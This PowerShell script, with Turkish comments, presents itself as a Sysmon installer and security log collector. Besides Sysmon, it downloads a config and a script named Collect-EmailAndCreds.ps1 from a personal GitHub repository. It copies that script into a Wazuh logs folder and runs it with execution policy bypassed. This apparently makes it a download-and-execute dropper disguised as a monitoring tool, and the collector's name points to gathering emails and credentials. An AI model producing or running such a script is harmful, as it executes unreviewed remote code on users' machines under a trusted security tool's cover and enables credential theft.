# Sysmon kurulumu ve veri toplayıcı betik çalıştırıcı (evrensel sürüm)

$TempDir = "$env:TEMP\SysmonInstall"
$SysmonZip = "$TempDir\Sysmon.zip"
$SysmonDir = "$TempDir\Sysmon"
$SysmonConfig = "$TempDir\sysmonconfig.xml"
$CollectorScript = "$TempDir\Collect-EmailAndCreds.ps1"

$SysmonURL = "https://download.sysinternals.com/files/Sysmon.zip"
$ConfigURL = "https://raw.githubusercontent.com/ubden/ubden/refs/heads/main/sysmon.xml"
$CollectorURL = "https://raw.githubusercontent.com/ubden/ubden/refs/heads/main/Collect-EmailAndCreds.ps1"

# Temiz başlangıç
if (Test-Path $TempDir) { Remove-Item $TempDir -Recurse -Force }
New-Item -ItemType Directory -Path $TempDir | Out-Null

# Dosyaları indir
Invoke-WebRequest -Uri $SysmonURL -OutFile $SysmonZip -UseBasicParsing
Invoke-WebRequest -Uri $ConfigURL -OutFile $SysmonConfig -UseBasicParsing
Invoke-WebRequest -Uri $CollectorURL -OutFile $CollectorScript -UseBasicParsing

# Zip çıkar
Expand-Archive -Path $SysmonZip -DestinationPath $SysmonDir -Force

# Sysmon binary tespiti
$SysmonExe = Join-Path $SysmonDir "Sysmon64.exe"
if (-not (Test-Path $SysmonExe)) {
    $SysmonExe = Join-Path $SysmonDir "Sysmon.exe"
}

# Sysmon yükle
Start-Process -FilePath $SysmonExe -ArgumentList "-accepteula -i `"$SysmonConfig`"" -Wait

# Toplayıcı scripti çalıştır
Write-Host "`n[*] Log Security Collector Calisiyor..." -ForegroundColor Cyan
Copy-Item -Path $CollectorScript -Destination "C:\ProgramData\Wazuh\Logs\Collect-EmailAndCreds.ps1" -Force
Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -File `"C:\ProgramData\Wazuh\Logs\Collect-EmailAndCreds.ps1`"" -Wait

Write-Host "[OK] Tum islemler basariyla tamamlandi." -ForegroundColor Green
